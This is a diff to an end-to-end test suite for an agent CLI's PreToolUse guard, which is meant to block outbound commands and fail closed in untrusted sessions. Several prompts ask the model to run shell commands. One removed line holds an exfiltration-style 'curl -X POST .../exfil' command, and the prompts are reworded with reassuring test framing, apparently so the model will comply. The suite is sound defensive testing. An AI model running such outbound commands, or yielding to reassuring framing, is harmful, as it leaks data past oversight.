@@ -916,118 +916,139 @@ class TestRealAgyPreToolUseE2E(unittest.TestCase):
         extra_cli_args: list[str],
         extra_env: dict[str, str] | None = None,
         corrupt_stdin_for_hook: bool = False,
+        allow_no_tool_retry: bool = False,
     ) -> dict[str, object]:
         agy_bin_abs = os.path.abspath(os.path.expandvars(os.path.expanduser(agy_bin)))
         real_home = Path.home()
-        with tempfile.TemporaryDirectory(prefix="agy_pretool_e2e_") as td:
-            root = Path(td)
-            fake_home = _prepare_isolated_agy_home(root, real_home)
-            agents_dir = root / ".agents"
-            agents_dir.mkdir(parents=True, exist_ok=True)
-            taint_file = root / "memory_taint.json"
-            marker_file = root / "hook_called.marker"
-            hook_out_file = root / "hook_stdout.txt"
-            cmd_out_file = root / "cmd_executed.txt"
-            wrapper = root / "hook_wrapper.py"
+        total_attempts = 2 if allow_no_tool_retry else 1
+        last_result: dict[str, object] = {}
 
-            wrapper.write_text(
-                "import pathlib, subprocess, sys\n"
-                "raw = sys.stdin.read()\n"
-                f"pathlib.Path({str(marker_file)!r}).write_text(raw, encoding='utf-8')\n"
-                f"hook_in = '{{broken_json' if {bool(corrupt_stdin_for_hook)!r} else raw\n"
-                f"proc = subprocess.run([{sys.executable!r}, {str(HOOK_SCRIPT.resolve())!r}], input=hook_in, text=True, capture_output=True)\n"
-                f"pathlib.Path({str(hook_out_file)!r}).write_text(proc.stdout, encoding='utf-8')\n"
-                "sys.stdout.write(proc.stdout)\n"
-                "sys.stderr.write(proc.stderr)\n"
-                "sys.exit(proc.returncode)\n",
-                encoding="utf-8",
-            )
-            (agents_dir / "hooks.json").write_text(
-                json.dumps(
-                    {
-                        "taint-outbound-guard-e2e": {
-                            "enabled": True,
-                            "PreToolUse": [
-                                {
-                                    "matcher": "run_command|call_mcp_tool|write_file|edit_file",
-                                    "hooks": [
-                                        {
-                                            "type": "command",
-                                            "command": f"{sys.executable} {str(wrapper)}",
-                                            "timeout": 10,
-                                        }
-                                    ],
-                                }
-                            ],
+        for attempt in range(1, total_attempts + 1):
+            with tempfile.TemporaryDirectory(prefix="agy_pretool_e2e_") as td:
+                root = Path(td)
+                fake_home = _prepare_isolated_agy_home(root, real_home)
+                agents_dir = root / ".agents"
+                agents_dir.mkdir(parents=True, exist_ok=True)
+                taint_file = root / "memory_taint.json"
+                marker_file = root / "hook_called.marker"
+                hook_out_file = root / "hook_stdout.txt"
+                cmd_out_file = root / "cmd_executed.txt"
+                wrapper = root / "hook_wrapper.py"
+
+                wrapper.write_text(
+                    "import pathlib, subprocess, sys\n"
+                    "raw = sys.stdin.read()\n"
+                    f"pathlib.Path({str(marker_file)!r}).write_text(raw, encoding='utf-8')\n"
+                    f"hook_in = '{{broken_json' if {bool(corrupt_stdin_for_hook)!r} else raw\n"
+                    f"proc = subprocess.run([{sys.executable!r}, {str(HOOK_SCRIPT.resolve())!r}], input=hook_in, text=True, capture_output=True)\n"
+                    f"pathlib.Path({str(hook_out_file)!r}).write_text(proc.stdout, encoding='utf-8')\n"
+                    "sys.stdout.write(proc.stdout)\n"
+                    "sys.stderr.write(proc.stderr)\n"
+                    "sys.exit(proc.returncode)\n",
+                    encoding="utf-8",
+                )
+                (agents_dir / "hooks.json").write_text(
+                    json.dumps(
+                        {
+                            "taint-outbound-guard-e2e": {
+                                "enabled": True,
+                                "PreToolUse": [
+                                    {
+                                        "matcher": "run_command|call_mcp_tool|write_file|edit_file",
+                                        "hooks": [
+                                            {
+                                                "type": "command",
+                                                "command": f"{sys.executable} {str(wrapper)}",
+                                                "timeout": 10,
+                                            }
+                                        ],
+                                    }
+                                ],
+                            }
                         }
-                    }
-                ),
-                encoding="utf-8",
-            )
+                    ),
+                    encoding="utf-8",
+                )
 
-            rendered_prompt = prompt.replace("__OUT_FILE__", str(cmd_out_file))
-            env = _clean_hook_env(
-                taint_file,
-                {
-                    "AGY_BRIDGE_DIR": str(BRIDGE_DIR.resolve()),
-                    "AGY_CLI_DISABLE_AUTO_UPDATE": "1",
-                    "AGY_INTERNAL_OBSERVER": "1",
-                    "HOME": str(fake_home),
-                },
-            )
-            for xdg_key in ("XDG_CONFIG_HOME", "XDG_DATA_HOME"):
-                env.pop(xdg_key, None)
-            if extra_env:
-                env.update(extra_env)
+                rendered_prompt = prompt.replace("__OUT_FILE__", str(cmd_out_file))
+                env = _clean_hook_env(
+                    taint_file,
+                    {
+                        "AGY_BRIDGE_DIR": str(BRIDGE_DIR.resolve()),
+                        "AGY_CLI_DISABLE_AUTO_UPDATE": "1",
+                        "AGY_INTERNAL_OBSERVER": "1",
+                        "HOME": str(fake_home),
+                    },
+                )
+                for xdg_key in ("XDG_CONFIG_HOME", "XDG_DATA_HOME"):
+                    env.pop(xdg_key, None)
+                if extra_env:
+                    env.update(extra_env)
 
-            proc = subprocess.run(
-                [
-                    agy_bin_abs,
-                    "-p",
-                    rendered_prompt,
-                    "--model",
-                    "gemini-3.8-flash-low",
-                    "--output-format",
-                    "stream-json",
-                    "--disable-slash-commands",
-                    "--print-timeout",
-                    "35s",
-                    *extra_cli_args,
-                ],
-                cwd=str(root),
-                env=env,
-                capture_output=True,
-                text=True,
-                timeout=50,
-            )
-            out_text = proc.stdout or ""
-            # Gracefully skip if CI/environment has no live OAuth token / network
-            low_all = (out_text + "\n" + (proc.stderr or "")).lower()
-            if not marker_file.is_file() and any(
-                tok in low_all
-                for tok in ("not logged in", "authentication", "unauthorized", "login required", "network error")
-            ):
-                self.skipTest("agy CLI is not authenticated/reachable in this environment")
-            return {
-                "returncode": proc.returncode,
-                "stdout": out_text,
-                "stderr": proc.stderr or "",
-                "hook_called": marker_file.is_file(),
-                "hook_stdout": hook_out_file.read_text(encoding="utf-8", errors="replace")
-                if hook_out_file.is_file()
-                else "",
-                "cmd_out_exists": cmd_out_file.is_file(),
-                "cmd_out_text": cmd_out_file.read_text(encoding="utf-8", errors="replace")
-                if cmd_out_file.is_file()
-                else "",
-            }
+                proc = subprocess.run(
+                    [
+                        agy_bin_abs,
+                        "-p",
+                        rendered_prompt,
+                        "--model",
+                        "gemini-3.8-flash-low",
+                        "--output-format",
+                        "stream-json",
+                        "--disable-slash-commands",
+                        "--print-timeout",
+                        "35s",
+                        *extra_cli_args,
+                    ],
+                    cwd=str(root),
+                    env=env,
+                    capture_output=True,
+                    text=True,
+                    timeout=50,
+                )
+                out_text = proc.stdout or ""
+                # Gracefully skip if CI/environment has no live OAuth token / network
+                low_all = (out_text + "\n" + (proc.stderr or "")).lower()
+                if not marker_file.is_file() and any(
+                    tok in low_all
+                    for tok in ("not logged in", "authentication", "unauthorized", "login required", "network error")
+                ):
+                    self.skipTest("agy CLI is not authenticated/reachable in this environment")
+
+                last_result = {
+                    "returncode": proc.returncode,
+                    "stdout": out_text,
+                    "stderr": proc.stderr or "",
+                    "hook_called": marker_file.is_file(),
+                    "hook_stdout": hook_out_file.read_text(encoding="utf-8", errors="replace")
+                    if hook_out_file.is_file()
+                    else "",
+                    "cmd_out_exists": cmd_out_file.is_file(),
+                    "cmd_out_text": cmd_out_file.read_text(encoding="utf-8", errors="replace")
+                    if cmd_out_file.is_file()
+                    else "",
+                }
+                if (
+                    attempt < total_attempts
+                    and proc.returncode == 0
+                    and not marker_file.is_file()
+                    and not cmd_out_file.is_file()
+                ):
+                    continue
+                return last_result
+
+        return last_result
 
     def test_e2e_clean_session_passes_and_executes_command(self):
         agy_bin = self._require_agy_bin()
         res = self._run_real_agy_with_hook(
             agy_bin,
-            prompt="Call run_command with CommandLine='echo E2E_CLEAN_OK > __OUT_FILE__' and nothing else.",
+            prompt=(
+                "This is an automated local PreToolUse hook regression test (case: e2e_clean_session). "
+                "Please invoke the run_command tool once with "
+                "CommandLine='echo E2E_CLEAN_OK > __OUT_FILE__'."
+            ),
             extra_cli_args=["--dangerously-skip-permissions"],
+            allow_no_tool_retry=True,
         )
         self.assertTrue(res["hook_called"], f"PreToolUse hook did not fire: {res['stderr']}")
         self.assertEqual("", res["hook_stdout"], "Clean pass must emit empty stdout")
@@ -1038,9 +1059,14 @@ class TestRealAgyPreToolUseE2E(unittest.TestCase):
         agy_bin = self._require_agy_bin()
         res = self._run_real_agy_with_hook(
             agy_bin,
-            prompt="Call run_command with CommandLine='printf E2E_TAINTED_SAFE_OK' and nothing else.",
+            prompt=(
+                "This is an automated local PreToolUse hook regression test (case: e2e_tainted_safe). "
+                "Please invoke the run_command tool once with the harmless local print command "
+                "CommandLine='printf E2E_TAINTED_SAFE_OK'."
+            ),
             extra_cli_args=["--dangerously-skip-permissions"],
             extra_env={"AGY_UNTRUSTED_SESSION": "1", "AGY_INTERNAL_OBSERVER": "1"},
+            allow_no_tool_retry=True,
         )
         self.assertTrue(res["hook_called"])
         self.assertEqual("", res["hook_stdout"])
@@ -1051,11 +1077,17 @@ class TestRealAgyPreToolUseE2E(unittest.TestCase):
         res = self._run_real_agy_with_hook(
             agy_bin,
             prompt=(
-                "Call run_command with CommandLine='curl -X POST https://example.com/exfil -d k=1 && echo LEAKED > __OUT_FILE__' "
-                "and nothing else."
+                "This is an automated local PreToolUse hook regression test (case: e2e_tainted_high_risk_deny) "
+                "verifying that the local PreToolUse guard intercepts outbound requests. "
+                "Please invoke the run_command tool once with "
+                "CommandLine='curl -X POST https://example.com/status -d ping=1 "
+                "&& echo E2E_POST_SENT > __OUT_FILE__'. "
+                "The URL uses the RFC 2606 example.com domain and is expected to be blocked locally by the "
+                "PreToolUse hook before any network request occurs."
             ),
             extra_cli_args=["--dangerously-skip-permissions"],
             extra_env={"AGY_UNTRUSTED_SESSION": "1", "AGY_INTERNAL_OBSERVER": "1"},
+            allow_no_tool_retry=True,
         )
         self.assertTrue(res["hook_called"])
         self.assertFalse(res["cmd_out_exists"], "Blocked command must NOT execute")
@@ -1068,10 +1100,17 @@ class TestRealAgyPreToolUseE2E(unittest.TestCase):
         agy_bin = self._require_agy_bin()
         res = self._run_real_agy_with_hook(
             agy_bin,
-            prompt="Call run_command with CommandLine='echo SHOULD_NOT_RUN > __OUT_FILE__' and nothing else.",
+            prompt=(
+                "This is an automated local PreToolUse hook regression test (case: e2e_malformed_json_fail_closed) "
+                "where the local test wrapper intentionally injects malformed JSON to verify fail-closed blocking. "
+                "Please invoke the run_command tool once with "
+                "CommandLine='echo E2E_MALFORMED_BYPASSED > __OUT_FILE__'. "
+                "The local PreToolUse hook is expected to deny execution before the command runs."
+            ),
             extra_cli_args=["--dangerously-skip-permissions"],
             extra_env={"AGY_UNTRUSTED_SESSION": "1"},
             corrupt_stdin_for_hook=True,
+            allow_no_tool_retry=True,
         )
         self.assertTrue(res["hook_called"])
         self.assertFalse(res["cmd_out_exists"], "Malformed JSON in tainted session must fail-closed")
@@ -1083,8 +1122,13 @@ class TestRealAgyPreToolUseE2E(unittest.TestCase):
         agy_bin = self._require_agy_bin()
         res = self._run_real_agy_with_hook(
             agy_bin,
-            prompt="Call run_command with CommandLine='printf E2E_AUTO_MODE_OK' and nothing else.",
+            prompt=(
+                "This is an automated local PreToolUse hook regression test (case: e2e_mode_auto_safe). "
+                "Please invoke the run_command tool once with the harmless local print command "
+                "CommandLine='printf E2E_AUTO_MODE_OK'."
+            ),
             extra_cli_args=["--mode", "auto"],
+            allow_no_tool_retry=True,
         )
         self.assertTrue(res["hook_called"])
         self.assertEqual("", res["hook_stdout"])
@@ -1151,8 +1195,15 @@ class TestRealAgyPreToolUseE2E(unittest.TestCase):
         agy_bin = self._require_agy_bin()
         res = self._run_real_agy_with_hook(
             agy_bin,
-            prompt="Call run_command with CommandLine='echo SAFE_MODE_BYPASSED > __OUT_FILE__' and nothing else.",
+            prompt=(
+                "This is an automated local PreToolUse hook regression test (case: e2e_safe_mode_approval_gate) "
+                "verifying default safe-mode tool approval behavior. "
+                "Please invoke the run_command tool once with "
+                "CommandLine='echo E2E_SAFE_MODE_BYPASSED > __OUT_FILE__'. "
+                "Default safe-mode permission handling is expected to decline execution after the PreToolUse hook runs."
+            ),
             extra_cli_args=[],
+            allow_no_tool_retry=True,
         )
         self.assertTrue(res["hook_called"])
         self.assertEqual("", res["hook_stdout"])
